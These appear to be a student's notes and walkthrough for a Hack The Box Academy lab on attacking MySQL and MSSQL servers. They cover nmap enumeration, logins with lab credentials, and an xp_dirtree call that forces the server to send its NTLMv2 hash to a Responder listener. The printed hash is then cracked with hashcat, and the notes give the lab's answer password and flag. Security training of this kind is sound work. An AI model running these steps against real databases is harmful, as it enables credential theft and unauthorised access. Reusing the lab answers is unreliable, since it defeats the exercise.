@@ -1,1 +1,150 @@
+we went over this in detail in footprinting but we will put more info in here : 
+
+
+MySQL and Microsoft SQL Server (MSSQL) are relational database management systems that store data in tables, columns, and rows. 
+Many relational database systems like MSSQL & MySQL use the Structured Query Language (SQL) for querying and maintaining the database.
+
+Enumeration:
+
+By default, MSSQL uses ports TCP/1433 and UDP/1434, and MySQL uses TCP/3306. However, when MSSQL operates in a "hidden" mode, it uses the TCP/2433 port. We can use Nmap's default scripts -sC option to enumerate database services on a target system:
+
+Syntax: MJBUCKNER@htb[/htb]$ nmap -Pn -sV -sC -p1433 10.10.10.125
+
+Host discovery disabled (-Pn). All addresses will be marked 'up', and scan times will be slower.
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-26 02:09 BST
+Nmap scan report for 10.10.10.125
+Host is up (0.0099s latency).
+
+PORT     STATE SERVICE  VERSION
+1433/tcp open  ms-sql-s Microsoft SQL Server 2017 14.00.1000.00; RTM
+| ms-sql-ntlm-info: 
+|   Target_Name: HTB
+|   NetBIOS_Domain_Name: HTB
+|   NetBIOS_Computer_Name: mssql-test
+|   DNS_Domain_Name: HTB.LOCAL
+|   DNS_Computer_Name: mssql-test.HTB.LOCAL
+|   DNS_Tree_Name: HTB.LOCAL
+|_  Product_Version: 10.0.17763
+| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
+| Not valid before: 2021-08-26T01:04:36
+|_Not valid after:  2051-08-26T01:04:36
+|_ssl-date: 2021-08-26T01:11:58+00:00; +2m05s from scanner time.
+
+Host script results:
+|_clock-skew: mean: 2m04s, deviation: 0s, median: 2m04s
+| ms-sql-info: 
+|   10.10.10.125:1433: 
+|     Version: 
+|       name: Microsoft SQL Server 2017 RTM
+|       number: 14.00.1000.00
+|       Product: Microsoft SQL Server 2017
+|       Service pack level: RTM
+|       Post-SP patches applied: false
+|_    TCP port: 1433
+
+Connecting to SQL Server : 
+
+Syntax: MJBUCKNER@htb[/htb]$ mysql -u julio -pPassword123 -h 10.129.20.13
+
+Welcome to the MariaDB monitor. Commands end with ; or \g.
+Your MySQL connection id is 8
+Server version: 8.0.28-0ubuntu0.20.04.3 (Ubuntu)
+
+Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.
+
+Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
+
+MySQL [(none)]>
+
+OR mssqlclient.py -> 
+
+Syntax: MJBUCKNER@htb[/htb]$ mssqlclient.py -p 1433 julio@10.129.203.7 
+
+Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
+
+Password: MyPassword!
+
+[*] Encryption required, switching to TLS
+[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
+[*] ENVCHANGE(LANGUAGE): Old Value: None, New Value: us_english
+[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
+[*] INFO(WIN-02\SQLEXPRESS): Line 1: Changed database context to 'master'.
+[*] INFO(WIN-02\SQLEXPRESS): Line 1: Changed language setting to us_english.
+[*] ACK: Result: 1 - Microsoft SQL Server (120 7208) 
+[!] Press help for extra shell commands
+SQL> 
+
+
+Sql Syntax: 
+
+Syntax: mysql> SHOW DATABASES;
+
++--------------------+
+| Database           |
++--------------------+
+| information_schema |
+| htbusers           |
++--------------------+
+2 rows in set (0.00 sec) 
+
+Syntax: mysql> USE htbusers;
+
+Database changed 
+
+
+Syntax: mysql> SHOW TABLES;
+
++----------------------------+
+| Tables_in_htbusers         |
++----------------------------+
+| actions                    |
+| permissions                |
+| permissions_roles          |
+| permissions_users          |
+| roles                      |
+| roles_users                |
+| settings                   |
+| users                      |
++----------------------------+
+8 rows in set (0.00 sec)
+
+Syntax: mysql> SELECT * FROM users;
+
++----+---------------+------------+---------------------+
+| id | username      | password   | date_of_joining     |
++----+---------------+------------+---------------------+
+|  1 | admin         | p@ssw0rd   | 2020-07-02 00:00:00 |
+|  2 | administrator | adm1n_p@ss | 2020-07-02 11:30:50 |
+|  3 | john          | john123!   | 2020-07-02 11:47:16 |
+|  4 | tom           | tom123!    | 2020-07-02 12:23:16 |
++----+---------------+------------+---------------------+
+4 rows in set (0.00 sec)
+
+
+
+
+Ima just dive into questions 
+-  Authenticate to 10.129.203.12 (ACADEMY-ATTCOMSVC-WIN-02) with user "htbdbuser" and password "MSSQLAccess01!"
+
+Question 1 -  What is the password for the "mssqlsvc" user? - princess1
+
+1) mssqlclient.py htbdbuser@10.129.203.12
+2) enter password
+3) going back through notes and other experience. Open new tab -> sudo responder -tun0 
+4) from section we tried - EXEC master..xp_dirtree '\\10.10.15.76\share\' -> this is from the mssqlclient.py session of htbdbuser -> 
+5) go back to responder tab -> copy entire hash
+6) mssqlsvc::WIN-02:62c6ef759203df8d:FC1C96A99E812FB4D30CF6E6C39988B0:010100000000000000B96D0FA074DB018456CBE2B611F6960000000002000800500042004E00440001001E00570049004E002D005300560045005900480039004E003300390034004A0004003400570049004E002D005300560045005900480039004E003300390034004A002E00500042004E0044002E004C004F00430041004C0003001400500042004E0044002E004C004F00430041004C0005001400500042004E0044002E004C004F00430041004C000700080000B96D0FA074DB01060004000200000008003000300000000000000000000000003000002C58CC4D0514E84E6D6AD98587A884D817C01ABC3FDAB7FCBB8A91A180E1542C0A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310035002E00370036000000000000000000
+7) on host machine nano a new .txt or .hash file doesnt matter 
+8) hashcat -m 5600 -a 0 mssqlsvc.hash /usr/share/wordlists/rockyou.txt
+9) cracked - princess1
+
+
+Question 2 - Enumerate the "flagDB" database and submit a flag as your answer. - so i thinkkkkkkkkkkkkkkkkkkk we can use mssqlclient again we just need to add the --window-auth flag maybe? lets try. - HTB{!_l0v3_#4$#!n9_4nd_r3$p0nd3r}
+1) mssqlclient.py -p 1433 mssqlsvc@10.129.203.12 -windows-auth
+2) enter password 
+3) from looking at databased from the htbdbuser sessio nwe know theres a flagdb so 
+5) use flagDB;
+6) SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES;
+7) select * from tb_flag;
+8) HTB{!_l0v3_#4$#!n9_4nd_r3$p0nd3r} 
 
